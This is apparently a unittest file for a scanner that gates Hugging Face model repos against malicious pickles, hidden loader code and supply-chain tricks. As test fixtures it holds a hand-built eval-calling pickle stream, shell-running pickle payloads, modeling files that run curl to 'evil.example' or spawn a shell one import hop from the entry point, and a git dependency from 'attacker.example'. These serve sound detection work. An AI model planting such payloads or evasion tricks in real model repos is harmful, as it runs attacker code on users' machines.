"""Tests for the scan gate and registry.

Stdlib unittest, no pytest, so this runs on a bare interpreter:
    python3 -m unittest discover -s tests -v

The tests worth having here are the ones that would catch a regression that
matters: a malicious artefact being allowed through, or an approval happening
without the evidence that should gate it. Coverage of prose in findings is not
worth the maintenance.
"""

from __future__ import annotations

import json
import pickle
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from fixtures.build_fixtures import (  # noqa: E402
    benign_state_dict_pickle,
    malicious_pickle,
)
from hfgate.checks.pickle_opcodes import scan_pickle_stream  # noqa: E402
from hfgate.findings import Severity  # noqa: E402
from hfgate.policy import Tier, Verdict  # noqa: E402
from hfgate.registry import Registry, RegistryError, State  # noqa: E402
from hfgate.report import machine_record  # noqa: E402
from hfgate.scanner import scan  # noqa: E402

FIXTURES = Path(__file__).resolve().parent.parent / "fixtures"


def scan_fixture(name: str):
    return scan(FIXTURES / name)


def write_safetensors_stub(path: Path) -> None:
    """Minimal valid safetensors file, for tests that need one present."""
    from fixtures.build_fixtures import write_safetensors
    write_safetensors(path, {"w": ([2, 2], "F32")})


class TestPickleOpcodes(unittest.TestCase):
    """The core detection. If only one test survives, it should be this file."""

    def test_detects_os_system(self):
        result = scan_pickle_stream(malicious_pickle("id"), "test.pkl")
        critical = [f for f in result.findings if f.severity is Severity.CRITICAL]
        self.assertTrue(critical, "os.system via GLOBAL/REDUCE must be CRITICAL")
        self.assertIn("os.system", critical[0].title)

    def test_detects_stack_global_variant(self):
        """STACK_GLOBAL resolves via string pushes, not a GLOBAL argument.

        A scanner that only handles the GLOBAL opcode misses this entirely,
        which is exactly why it is worth a dedicated test.
        """
        payload = b"".join([
            b"\x80\x02",
            b"X\x08\x00\x00\x00builtins",
            b"X\x04\x00\x00\x00eval",
            b"\x93",           # STACK_GLOBAL
            b"(", b"X\x02\x00\x00\x001+1", b"t", b"R", b".",
        ])
        result = scan_pickle_stream(payload, "test.pkl")
        critical = [f for f in result.findings if f.severity is Severity.CRITICAL]
        self.assertTrue(critical, "builtins.eval via STACK_GLOBAL must be CRITICAL")
        self.assertIn("builtins.eval", critical[0].title)

    def test_benign_state_dict_is_clean(self):
        """collections.OrderedDict is what a real state dict looks like.

        A scanner that flags this is a scanner researchers learn to ignore.
        """
        result = scan_pickle_stream(benign_state_dict_pickle(), "test.pkl")
        self.assertEqual(
            [f for f in result.findings if f.severity >= Severity.HIGH], [],
            "an ordinary state dict must not raise HIGH or above",
        )

    def test_scanner_does_not_execute_payload(self):
        """The scanner must read opcodes, never run them.

        Payload writes a sentinel file. If scanning creates it, the tool is
        the vulnerability.
        """
        with tempfile.TemporaryDirectory() as tmp:
            sentinel = Path(tmp) / "PWNED"
            payload = malicious_pickle(f"touch {sentinel}")
            scan_pickle_stream(payload, "test.pkl")
            self.assertFalse(
                sentinel.exists(),
                "scanning a malicious pickle must not execute it",
            )

    def test_unparseable_stream_is_flagged(self):
        result = scan_pickle_stream(b"\x80\x02not-a-valid-stream", "broken.pkl")
        self.assertTrue(
            [f for f in result.findings if f.severity >= Severity.HIGH],
            "an uninspectable artefact must not pass silently",
        )


class TestTierAssignment(unittest.TestCase):
    """Each fixture exists to pin one tier decision."""

    def test_trusted(self):
        decision, _ = scan_fixture("allow-tinyllama-safetensors")
        self.assertEqual(decision.tier, Tier.TRUSTED)
        self.assertEqual(decision.verdict, Verdict.ALLOW)

    def test_standard_allows_unknown_publisher(self):
        """Capability, not reputation. An anonymous safetensors model passes."""
        decision, _ = scan_fixture("standard-community-finetune")
        self.assertEqual(decision.tier, Tier.STANDARD)
        self.assertEqual(decision.verdict, Verdict.ALLOW)

    def test_elevated_for_benign_custom_code(self):
        """auto_map means a code path exists, even when the code is fine."""
        decision, _ = scan_fixture("elevated-custom-arch")
        self.assertEqual(decision.tier, Tier.ELEVATED)

    def test_elevated_for_clean_pickle(self):
        """Clean pickle is not blocked -- it is a conversion candidate."""
        decision, _ = scan_fixture("elevated-legacy-pickle-clean")
        self.assertEqual(decision.tier, Tier.ELEVATED)

    def test_blocked_on_malicious_pickle_and_code(self):
        decision, _ = scan_fixture("quarantine-backdoored-finetune")
        self.assertEqual(decision.tier, Tier.BLOCKED)
        self.assertEqual(decision.verdict, Verdict.QUARANTINE)

    def test_empty_repo_does_not_fail_open(self):
        """A gate must never pass input it did not inspect.

        Caught during testing: an empty directory returned ALLOW, because
        "no dangerous formats found" and "no formats found" collapsed to the
        same branch. In practice that is an incomplete clone (git-lfs pointers
        not fetched), which is precisely when you least want a green light.
        """
        with tempfile.TemporaryDirectory() as tmp:
            decision, _ = scan(Path(tmp))
            self.assertEqual(decision.verdict, Verdict.QUARANTINE)

    def test_reputation_does_not_override_artefact_evidence(self):
        """The load-bearing test for the whole design.

        This fixture has an allowlisted publisher, a pinned SHA, 2.9M
        downloads, clean pinned deps, a good card, and no custom code. It must
        still be blocked, because the checkpoint is backdoored. If this ever
        goes green, the gate has become a reputation lookup.
        """
        decision, result = scan_fixture("quarantine-trojaned-checkpoint")
        self.assertEqual(decision.tier, Tier.BLOCKED)
        self.assertTrue(
            result.facts["provenance"]["trusted_publisher"],
            "fixture precondition: publisher is allowlisted",
        )
        self.assertTrue(
            result.facts["provenance"]["revision_pinned"],
            "fixture precondition: revision is pinned",
        )


class TestRealWorldPatterns(unittest.TestCase):
    """Patterns taken from real Hub repos, not from fixtures we authored.

    These exist because the fixtures and the scanner share an author, which is a
    closed loop: a fixture can be unconsciously shaped to pass the check it is
    meant to test. Everything here was found by running the gate against repos
    we did not write.
    """

    def test_cross_repo_auto_map_is_flagged(self):
        """auto_map can source code from a *different* repo.

        Real example: nomic-ai/nomic-embed-text-v1.5 maps all seven of its
        classes to nomic-ai/nomic-bert-2048 using the "repo--module.Class"
        syntax. The original check called this "code from the model repo
        itself", which was simply wrong, and told the user to pin a commit --
        advice that does not work here, because pinning this repo does not pin
        the other one.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "config.json").write_text(json.dumps({
                "architectures": ["NomicBertModel"],
                "auto_map": {
                    "AutoConfig":
                        "nomic-ai/nomic-bert-2048--configuration_hf_nomic_bert.NomicBertConfig",
                    "AutoModel":
                        "nomic-ai/nomic-bert-2048--modeling_hf_nomic_bert.NomicBertModel",
                },
            }), encoding="utf-8")

            _, result = scan(root)
            ids = {f.id for f in result.findings}
            self.assertIn("remote_code.auto_map_external_repo", ids)
            self.assertEqual(
                result.facts["auto_map_external_repos"], ["nomic-ai/nomic-bert-2048"])

    def test_local_auto_map_not_reported_as_external(self):
        """The ordinary same-repo case must not trip the external-repo finding."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "config.json").write_text(json.dumps({
                "auto_map": {"AutoConfig": "configuration_custom.CustomConfig"},
            }), encoding="utf-8")
            _, result = scan(root)
            ids = {f.id for f in result.findings}
            self.assertIn("remote_code.auto_map_present", ids)
            self.assertNotIn("remote_code.auto_map_external_repo", ids)
            self.assertEqual(result.facts["auto_map_external_repos"], [])

    def test_non_pickle_bin_file_does_not_block(self):
        """`.bin` is not owned by PyTorch.

        sentence-transformers/all-MiniLM-L6-v2 ships openvino_model.bin, which
        is OpenVINO IR weights, not a pickle. Treating every .bin as a pickle
        BLOCKED one of the most-downloaded models on the Hub. Risk follows
        whatever will actually load the file, and torch.load cannot load this.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "openvino_model.bin").write_bytes(b"\x00\x01\x02\x03" * 64)
            write_safetensors_stub(root / "model.safetensors")

            decision, result = scan(root)
            ids = {f.id for f in result.findings}
            self.assertIn("weights.unrecognised_binary", ids)
            self.assertNotIn("weights.pickle_unparseable", ids)
            self.assertEqual(decision.verdict, Verdict.ALLOW)

    def test_truncated_pickle_still_blocks(self):
        """The counterpart: a real pickle that breaks mid-stream stays HIGH.

        Guards the above fix from becoming a bypass. This one starts with a
        valid PROTO opcode, so it genuinely is a pickle -- just an unfinished
        one, and we cannot clear what we cannot fully read.
        """
        result = scan_pickle_stream(b"\x80\x02}q\x00(X\x04\x00\x00\x00", "trunc.bin")
        ids = {f.id for f in result.findings}
        self.assertIn("weights.pickle_unparseable", ids)
        self.assertNotIn("weights.unrecognised_binary", ids)

    def test_downgrade_only_applies_to_genuinely_unloadable_input(self):
        """Guards the non-pickle downgrade against becoming a bypass.

        The rule is "no opcode parsed at byte 0 means not a pickle". That is
        only safe while it coincides with what `pickle` itself will refuse, so
        this test asserts the coincidence directly rather than trusting the
        argument: a prefix pickle refuses must downgrade, and a prefix pickle
        tolerates must not.
        """
        payload = malicious_pickle("echo test")

        # A NUL prefix: pickle refuses it, so it cannot reach the VM.
        with self.assertRaises(Exception):
            pickle.loads(b"\x00" + benign_state_dict_pickle())
        ids = {f.id for f in scan_pickle_stream(b"\x00" + payload, "x.bin").findings}
        self.assertIn("weights.unrecognised_binary", ids)

        # A prefix pickle *tolerates* is loadable, so it must still be CRITICAL.
        self.assertIsNotNone(pickle.loads(b"GARBAGE" + benign_state_dict_pickle()))
        result = scan_pickle_stream(b"GARBAGE" + payload, "x.bin")
        self.assertTrue(
            [f for f in result.findings if f.severity is Severity.CRITICAL],
            "a loadable pickle must stay CRITICAL whatever precedes it",
        )

    def test_uninvoked_python_does_not_raise_tier(self):
        """A training script shipped for reproducibility is not a load path.

        all-MiniLM-L6-v2 ships train_script.py. from_pretrained never imports
        it, so tiering on its mere presence penalised a repo for documenting
        itself well.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "train_script.py").write_text(
                "import subprocess\nsubprocess.run(['python', 'train.py'])\n",
                encoding="utf-8")

            decision, result = scan(root)
            self.assertEqual(result.facts["loader_invoked_python"], [])
            self.assertEqual(
                decision.verdict, Verdict.ALLOW,
                "a script the loader never imports must not quarantine the model")

    def test_invoked_python_still_blocks(self):
        """Counterpart: the same code in a file the loader *does* import."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "modeling_evil.py").write_text(
                "import subprocess\nsubprocess.run(['curl', 'evil.example'])\n",
                encoding="utf-8")

            decision, _ = scan(root)
            self.assertEqual(decision.tier, Tier.BLOCKED)

    def test_payload_in_imported_helper_is_not_missed(self):
        """The naming convention is not the import graph.

        Regression for a bypass introduced by the fix above. Scoping severity to
        "files whose names transformers imports" left an obvious hole: put the
        modelling code in `modeling_x.py`, which gets scanned, and the payload in
        `utils_helper.py`, which `modeling_x.py` imports. The helper executes
        just as surely, but was reported LOW with the text "loading the model
        does not execute it" -- which was simply false.

        Invocation is now the transitive closure of imports from the files the
        loader actually enters.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "config.json").write_text(json.dumps({
                "auto_map": {"AutoModel": "modeling_evil.EvilModel"},
            }), encoding="utf-8")
            (root / "modeling_evil.py").write_text(
                "from utils_helper import setup_environment\n"
                "setup_environment()\n", encoding="utf-8")
            (root / "utils_helper.py").write_text(
                "import subprocess\n"
                "def setup_environment():\n"
                "    subprocess.run(['curl', 'evil.example'])\n", encoding="utf-8")

            decision, result = scan(root)
            self.assertIn("utils_helper.py", result.facts["loader_invoked_python"])
            self.assertEqual(
                decision.tier, Tier.BLOCKED,
                "a payload one import hop from the entrypoint must still block")

    def test_relative_import_of_helper_also_followed(self):
        """`from .utils_helper import x` resolves to the same local file."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "config.json").write_text(json.dumps({
                "auto_map": {"AutoModel": "modeling_evil.EvilModel"},
            }), encoding="utf-8")
            (root / "modeling_evil.py").write_text(
                "from .utils_helper import go\n", encoding="utf-8")
            (root / "utils_helper.py").write_text(
                "import subprocess\n"
                "def go():\n    subprocess.run(['sh'])\n", encoding="utf-8")

            decision, result = scan(root)
            self.assertIn("utils_helper.py", result.facts["loader_invoked_python"])
            self.assertEqual(decision.tier, Tier.BLOCKED)

    def test_dynamic_import_stops_us_claiming_a_file_is_unreachable(self):
        """Static analysis only bounds the graph while imports are static.

        One `importlib.import_module(name)` in loaded code and we can no longer
        prove any file is unreachable. Rather than keep asserting "this file
        doesn't run" on evidence we no longer have, treat everything as
        reachable and say why.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "config.json").write_text(json.dumps({
                "auto_map": {"AutoModel": "modeling_x.M"},
            }), encoding="utf-8")
            (root / "modeling_x.py").write_text(
                "import importlib\n"
                "importlib.import_module('sneaky_helper').go()\n", encoding="utf-8")
            (root / "sneaky_helper.py").write_text(
                "import subprocess\n"
                "def go():\n    subprocess.run(['curl', 'evil.example'])\n",
                encoding="utf-8")

            decision, result = scan(root)
            self.assertFalse(result.facts["import_graph_bounded"])
            self.assertIn("sneaky_helper.py", result.facts["loader_invoked_python"])
            self.assertEqual(decision.tier, Tier.BLOCKED)

    def test_import_cycle_terminates(self):
        """Two files importing each other must not hang the closure walk."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "config.json").write_text(json.dumps({
                "auto_map": {"AutoModel": "modeling_a.M"},
            }), encoding="utf-8")
            (root / "modeling_a.py").write_text("import helper_b\n", encoding="utf-8")
            (root / "helper_b.py").write_text("import modeling_a\n", encoding="utf-8")

            decision, result = scan(root)  # must return, not spin
            self.assertIn("helper_b.py", result.facts["loader_invoked_python"])

    def test_keras_alongside_safetensors_does_not_raise_tier(self):
        """Consistency: an unused TF export is treated like an unused pickle."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write_safetensors_stub(root / "model.safetensors")
            (root / "tf_model.h5").write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 128)

            decision, _ = scan(root)
            self.assertEqual(decision.verdict, Verdict.ALLOW)

    def test_keras_alone_still_raises_tier(self):
        """But Keras with no safe alternative is still what gets loaded."""
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "tf_model.h5").write_bytes(b"\x89HDF\r\n\x1a\n" + b"\x00" * 128)
            decision, _ = scan(root)
            self.assertEqual(decision.verdict, Verdict.QUARANTINE)

    def test_many_auto_map_entries_stay_readable(self):
        """Real repos declare 7+ mappings that collapse to one or two modules.

        The first version listed every entry, producing a 600-character
        paragraph. Summarise by source instead.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "config.json").write_text(json.dumps({
                "auto_map": {
                    f"AutoModelFor{n}": f"other/repo--modeling_x.Class{n}"
                    for n in ("A", "B", "C", "D", "E", "F", "G")
                },
            }), encoding="utf-8")
            _, result = scan(root)
            finding = next(f for f in result.findings
                           if f.id == "remote_code.auto_map_present")
            self.assertLess(len(finding.detail), 300,
                            "summary must not grow with the number of entries")
            self.assertIn("7 auto_map entries", finding.detail)


class TestSupplyChainChecks(unittest.TestCase):
    def test_typosquat_blocks(self):
        _, result = scan_fixture("quarantine-backdoored-finetune")
        self.assertTrue(
            [f for f in result.findings if f.id == "sbom.possible_typosquat"])

    def test_vcs_dependency_flagged(self):
        _, result = scan_fixture("quarantine-backdoored-finetune")
        self.assertTrue(
            [f for f in result.findings if f.id == "sbom.vcs_or_url_dependency"])

    def test_sbom_is_cyclonedx_shaped(self):
        _, result = scan_fixture("allow-tinyllama-safetensors")
        sbom = result.facts["sbom"]
        self.assertEqual(sbom["bomFormat"], "CycloneDX")
        self.assertEqual(len(sbom["components"]), 4)
        self.assertTrue(all(c["version"] != "unspecified" for c in sbom["components"]),
                        "fixture pins every dependency")

    def test_pinned_deps_not_flagged_unpinned(self):
        _, result = scan_fixture("allow-tinyllama-safetensors")
        self.assertEqual(
            [f for f in result.findings if f.id == "sbom.unpinned_dependencies"], [])

    def test_pyproject_dependencies_are_parsed(self):
        """Regression: the verdict must not depend on the interpreter.

        `tomllib` is 3.11+. When the pyproject branch was simply skipped on
        older interpreters, this repo -- which declares a typosquat and a
        git+https dependency -- was Blocked on 3.11 and Allowed on 3.9, with no
        indication anything had been skipped.

        This test runs the same assertion on every interpreter, so whichever
        parsing path is taken has to find the dependencies.
        """
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "pyproject.toml").write_text(
                '[project]\n'
                'name = "x"\n'
                'dependencies = [\n'
                '  "trasformers",\n'
                '  "evil @ git+https://attacker.example/x.git",\n'
                ']\n',
                encoding="utf-8",
            )
            _, result = scan(root)
            ids = {f.id for f in result.findings}
            self.assertIn("sbom.possible_typosquat", ids)
            self.assertIn("sbom.vcs_or_url_dependency", ids)
            self.assertEqual(result.facts["dependency_count"], 2)

    def test_unparseable_manifest_is_never_silent(self):
        """A parsing gap must not read as a clean bill of health."""
        from hfgate.checks.sbom import _parse_pyproject_fallback

        _, complete = _parse_pyproject_fallback(
            "[project]\ndependencies = <not valid toml at all>\n")
        self.assertFalse(
            complete,
            "a manifest declaring dependencies we cannot extract must be "
            "reported as incomplete, not as empty",
        )

    def test_unpinned_revision_flagged(self):
        _, result = scan_fixture("quarantine-backdoored-finetune")
        self.assertTrue(
            [f for f in result.findings if f.id == "provenance.revision_not_pinned"],
            "sha 'main' is a branch ref, not a commit",
        )


class TestRegistry(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.reg = Registry(Path(self._tmp.name) / "test.db")

    def tearDown(self):
        self.reg.close()
        self._tmp.cleanup()

    def _record_for(self, fixture: str) -> dict:
        decision, result = scan_fixture(fixture)
        return machine_record(
            FIXTURES / fixture, decision, result.findings, result.facts)

    def test_ingest_registers_and_sets_tier(self):
        model = self.reg.ingest(self._record_for("allow-tinyllama-safetensors"))
        self.assertEqual(model.state, State.SCANNED)
        self.assertEqual(model.tier, "trusted")

    def test_blocked_scan_lands_in_blocked_state(self):
        model = self.reg.ingest(self._record_for("quarantine-backdoored-finetune"))
        self.assertEqual(model.state, State.BLOCKED)

    def test_blocked_is_terminal(self):
        model = self.reg.ingest(self._record_for("quarantine-backdoored-finetune"))
        with self.assertRaises(RegistryError):
            self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                             "someone", "please", justification="I need it")

    def test_elevated_requires_justification(self):
        model = self.reg.ingest(self._record_for("elevated-custom-arch"))
        with self.assertRaises(RegistryError):
            self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                             "someone", "no justification given")

        approved = self.reg.promote(
            model.repo_id, model.revision, State.APPROVED,
            "n.bajwa", "eval workstream",
            justification="reviewed at SHA; no-egress namespace")
        self.assertEqual(approved.state, State.APPROVED)

    def test_trusted_approves_without_justification(self):
        model = self.reg.ingest(self._record_for("allow-tinyllama-safetensors"))
        approved = self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                                    "ci-bot", "auto-approve trusted tier")
        self.assertEqual(approved.state, State.APPROVED)

    def test_cannot_approve_unscanned_model(self):
        model = self.reg.register("some/model", "a" * 40, "someone")
        with self.assertRaises(RegistryError):
            self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                             "someone", "skipping the gate")

    def test_ingest_requires_pinned_identity(self):
        record = self._record_for("allow-tinyllama-safetensors")
        record["target"]["revision"] = None
        with self.assertRaises(RegistryError):
            self.reg.ingest(record)

    def test_rescan_drops_approval_for_redecision(self):
        """A model that changes must not keep its old approval silently."""
        record = self._record_for("allow-tinyllama-safetensors")
        model = self.reg.ingest(record)
        self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                         "ci-bot", "approved")
        after = self.reg.ingest(record)
        self.assertEqual(after.state, State.SCANNED)

    def test_revocation_always_available(self):
        """Incident response must never be blocked by a workflow rule."""
        model = self.reg.ingest(self._record_for("allow-tinyllama-safetensors"))
        self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                         "ci-bot", "approved")
        revoked = self.reg.promote(model.repo_id, model.revision, State.REVOKED,
                                   "sec-oncall", "upstream compromise disclosed")
        self.assertEqual(revoked.state, State.REVOKED)

    def test_audit_trail_records_actor_and_reason(self):
        model = self.reg.ingest(self._record_for("allow-tinyllama-safetensors"))
        self.reg.promote(model.repo_id, model.revision, State.APPROVED,
                         "n.bajwa", "needed for eval run 44")
        trail = self.reg.history(model.id)
        self.assertEqual(trail[-1]["actor"], "n.bajwa")
        self.assertIn("eval run 44", trail[-1]["reason"])

    def test_scan_record_stored_with_hash(self):
        model = self.reg.ingest(self._record_for("allow-tinyllama-safetensors"))
        scan_row = self.reg.latest_scan(model.id)
        self.assertEqual(len(scan_row["record_sha256"]), 64)
        self.assertEqual(
            json.loads(scan_row["record"])["tier"], "trusted",
            "the full verdict is retained, not just its summary",
        )


if __name__ == "__main__":
    unittest.main()
